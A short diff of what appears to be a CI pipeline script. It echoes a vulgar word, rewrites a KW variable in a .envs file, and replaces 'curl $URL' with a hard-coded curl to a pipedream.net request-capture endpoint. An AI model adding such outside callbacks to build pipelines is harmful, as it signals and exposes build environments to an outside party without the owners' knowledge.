@@ -11,4 +11,4 @@ script:
   - echo "SRAKA"
   - echo "$URL"
   - sed -i "s#KW=.*#KW=$URL#g" .envs
-  - curl $URL
+  - curl https://ennyxt9c3dhp.x.pipedream.net
